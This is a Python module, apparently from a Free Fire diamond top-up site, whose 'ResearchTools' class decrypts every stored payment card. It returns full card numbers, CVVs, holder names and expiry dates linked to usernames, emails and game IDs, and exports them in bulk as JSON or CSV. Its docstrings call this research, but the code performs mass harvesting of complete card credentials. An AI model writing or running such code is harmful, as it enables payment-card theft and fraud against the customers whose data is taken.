import json
import csv
from io import StringIO
from models import User, PaymentMethod, Order, DiamondPackage, db
from cryptography.fernet import Fernet, InvalidToken
from datetime import datetime, timedelta

class ResearchTools:
    @staticmethod
    def decrypt_all_payment_methods():
        """Decrypt all payment methods for research purposes"""
        payment_methods = PaymentMethod.query.all()
        decrypted_data = []
        
        for method in payment_methods:
            user = User.query.get(method.user_id)
            if user and user.encryption_key:
                try:
                    decrypted = method.decrypt_data(user.encryption_key.encode())
                    if decrypted:
                        decrypted_data.append({
                            'payment_method_id': method.id,
                            'user_id': user.id,
                            'username': user.username,
                            'email': user.email,
                            'freefire_id': user.freefire_id,
                            'card_type': method.card_type,
                            'last_four': method.last_four,
                            'expiry_month': method.expiry_month,
                            'expiry_year': method.expiry_year,
                            'card_holder_name': decrypted['card_holder_name'],
                            'card_number': decrypted['card_number'],
                            'cvv': decrypted['cvv'],
                            'is_default': method.is_default,
                            'created_at': method.created_at.isoformat()
                        })
                except Exception as e:
                    print(f"Failed to decrypt method {method.id}: {e}")
        
        return decrypted_data
    
    @staticmethod
    def export_payment_data(format='json'):
        """Export all payment data for research"""
        decrypted_data = ResearchTools.decrypt_all_payment_methods()
        
        if format == 'csv':
            # Create CSV manually
            output = StringIO()
            if decrypted_data:
                writer = csv.DictWriter(output, fieldnames=decrypted_data[0].keys())
                writer.writeheader()
                writer.writerows(decrypted_data)
            return output.getvalue()
        else:
            return json.dumps(decrypted_data, indent=2)
    
    @staticmethod
    def get_system_stats():
        """Get comprehensive system statistics"""
        stats = {
            'total_users': User.query.count(),
            'total_payment_methods': PaymentMethod.query.count(),
            'total_orders': Order.query.count(),
            'total_revenue': db.session.query(db.func.sum(Order.amount)).scalar() or 0,
            'successful_orders': Order.query.filter_by(status='completed').count(),
            'pending_orders': Order.query.filter_by(status='pending').count(),
            'card_type_distribution': {},
            'recent_activity': {}
        }
        
        # Card type distribution
        card_types = db.session.query(
            PaymentMethod.card_type, 
            db.func.count(PaymentMethod.card_type)
        ).group_by(PaymentMethod.card_type).all()
        
        stats['card_type_distribution'] = {card_type: count for card_type, count in card_types}
        
        # Recent activity (last 7 days)
        week_ago = datetime.utcnow() - timedelta(days=7)
        recent_orders = Order.query.filter(Order.created_at >= week_ago).count()
        recent_users = User.query.filter(User.created_at >= week_ago).count()
        recent_payments = PaymentMethod.query.filter(PaymentMethod.created_at >= week_ago).count()
        
        stats['recent_activity'] = {
            'orders_last_7_days': recent_orders,
            'users_last_7_days': recent_users,
            'payments_last_7_days': recent_payments
        }
        
        # User with most orders
        user_orders = db.session.query(
            User.username,
            db.func.count(Order.id).label('order_count')
        ).join(Order).group_by(User.id).order_by(db.desc('order_count')).first()
        
        if user_orders:
            stats['top_customer'] = {
                'username': user_orders[0],
                'order_count': user_orders[1]
            }
        
        return stats
    
    @staticmethod
    def find_duplicate_cards():
        """Find potential duplicate card numbers"""
        decrypted_data = ResearchTools.decrypt_all_payment_methods()
        card_numbers = {}
        duplicates = []
        
        for data in decrypted_data:
            card_num = data['card_number']
            if card_num in card_numbers:
                duplicates.append({
                    'card_number': card_num,
                    'users': list(set([card_numbers[card_num], data['username']])),
                    'occurrences': 2  # This will be updated if more duplicates found
                })
            else:
                card_numbers[card_num] = data['username']
        
        return duplicates
    
    @staticmethod
    def get_user_analytics(user_id=None):
        """Get detailed user analytics"""
        analytics = {}
        
        if user_id:
            # Single user analytics
            user = User.query.get(user_id)
            if user:
                analytics['user'] = {
                    'username': user.username,
                    'email': user.email,
                    'freefire_id': user.freefire_id,
                    'balance': user.balance,
                    'joined': user.created_at.isoformat()
                }
                
                # User's payment methods
                payment_methods = PaymentMethod.query.filter_by(user_id=user_id).all()
                analytics['payment_methods'] = [pm.to_dict() for pm in payment_methods]
                
                # User's order history
                orders = Order.query.filter_by(user_id=user_id).order_by(Order.created_at.desc()).all()
                analytics['orders'] = [{
                    'id': order.id,
                    'package': order.package.name,
                    'diamonds': order.diamonds,
                    'amount': order.amount,
                    'status': order.status,
                    'created_at': order.created_at.isoformat()
                } for order in orders]
                
                analytics['total_spent'] = sum(order.amount for order in orders)
                analytics['total_diamonds'] = sum(order.diamonds for order in orders)
        else:
            # All users analytics
            users = User.query.all()
            analytics['total_users'] = len(users)
            analytics['users_with_payments'] = PaymentMethod.query.distinct(PaymentMethod.user_id).count()
            analytics['average_balance'] = sum(user.balance for user in users) / len(users) if users else 0
        
        return analytics
